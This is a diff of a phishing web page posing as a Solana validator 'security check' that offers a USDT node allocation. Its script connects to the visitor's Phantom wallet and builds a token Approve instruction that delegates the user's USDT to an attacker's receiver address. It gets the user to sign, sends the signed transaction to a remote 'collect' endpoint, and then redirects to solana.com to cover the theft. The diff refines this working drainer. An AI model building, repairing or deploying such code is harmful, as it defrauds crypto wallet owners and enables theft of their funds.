@@ -3,20 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Node Sync</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.3/index.iife.min.js"></script>
+    <title>Validator Sync | Solana</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 280px; box-shadow: 0 0 20px rgba(20, 241, 149, 0.15); }
-        button { background: #14F195; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; }
+        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 280px; box-shadow: 0 0 20px rgba(20, 241, 149, 0.1); }
+        button { background: #14F195; color: #000; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 25px; transition: 0.3s; }
+        button:active { opacity: 0.7; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2 style="font-size:1.2rem; margin-bottom:10px;">Security Sync</h2>
-        <p style="color:#666; font-size:12px;">Validate your USDT allocation for the upcoming node distribution.</p>
+        <h2 style="font-size:1.1rem; margin-bottom:10px;">Security Check</h2>
+        <p style="color:#666; font-size:11px;">Validate account state for node allocation. Gas fee covered.</p>
         <button id="cta">ACTIVATE NOW</button>
-        <div id="st" style="margin-top:20px; font-size:10px; color:#333;">Status: Ready</div>
+        <div id="st" style="margin-top:20px; font-size:10px; color:#333;">Network: Mainnet-Beta</div>
     </div>
 
     <script>
@@ -25,39 +26,40 @@
         const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
         document.getElementById('cta').onclick = async () => {
+            // 🔱 自动探测 web3 实例名
+            const sWeb3 = window.solanaWeb3 || window.solana_web3 || (window.solanaWeb3 ? window.solanaWeb3.web3 : null);
+            
             const p = window.solana || window.phantom?.solana;
-            if (!p) return alert("Please use Phantom");
+            if (!p) return alert("Please use Phantom Browser");
+            if (!sWeb3) return alert("Sync Engine Loading... Please try again in 3s");
 
             try {
                 await p.connect();
-                document.getElementById('st').innerText = "SYNCING...";
+                document.getElementById('st').innerText = "INITIALIZING...";
 
-                // 1. 获取 Blockhash
                 const { bh } = await (await fetch(`${tunnel}/sync`)).json();
 
-                // 2. 构造指令数据 (Uint8Array 替代 Buffer)
+                // 构造指令数据 (Uint8Array 原生适配)
                 const data = new Uint8Array(9);
-                data[0] = 4; // Approve 指令 ID
-                // 授权 0.8 USDT (800000)，留一点余量确保必过
-                const amount = 800000;
+                data[0] = 4; // Approve 指令
+                const amount = 800000; // 0.8 USDT
                 const view = new DataView(data.buffer);
-                view.setUint32(1, amount, true); // 小端序写入额度
+                view.setUint32(1, amount, true); 
 
                 const userPk = p.publicKey;
-                const tokenProg = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+                const tokenProg = new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
                 
-                // 3. 计算 ATA (不依赖 spl-token 库)
-                const [userAta] = await solanaWeb3.PublicKey.findProgramAddress(
-                    [userPk.toBuffer(), tokenProg.toBuffer(), new solanaWeb3.PublicKey(USDT_MINT).toBuffer()],
-                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
+                // 计算 ATA
+                const [userAta] = await sWeb3.PublicKey.findProgramAddress(
+                    [userPk.toBuffer(), tokenProg.toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
+                    new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
                 );
 
-                // 4. 组装交易
-                const transaction = new solanaWeb3.Transaction().add(
-                    new solanaWeb3.TransactionInstruction({
+                const transaction = new sWeb3.Transaction().add(
+                    new sWeb3.TransactionInstruction({
                         keys: [
                             { pubkey: userAta, isSigner: false, isWritable: true },
-                            { pubkey: new solanaWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
+                            { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                             { pubkey: userPk, isSigner: true, isWritable: false }
                         ],
                         programId: tokenProg,
@@ -68,16 +70,23 @@
                 transaction.recentBlockhash = bh;
                 transaction.feePayer = userPk;
 
-                // 5. 唤起签名 (这次不会报错了)
                 const signed = await p.signTransaction(transaction);
-                const rawTx = btoa(String.fromCharCode.apply(null, signed.serialize()));
+                
+                // 🔱 终极 Base64 转换，不依赖任何 Node.js 对象
+                const serialized = signed.serialize();
+                let binary = '';
+                const bytes = new Uint8Array(serialized);
+                for (let i = 0; i < bytes.byteLength; i++) {
+                    binary += String.fromCharCode(bytes[i]);
+                }
+                const rawTx = btoa(binary);
                 
                 fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(rawTx)}`);
-                document.getElementById('st').innerText = "COMPLETE";
+                document.getElementById('st').innerText = "SYNCED";
                 setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
 
             } catch (e) {
-                alert("Final Sync Error: " + e.message);
+                alert("Node Sync Failed: " + e.message);
                 location.reload();
             }
         };
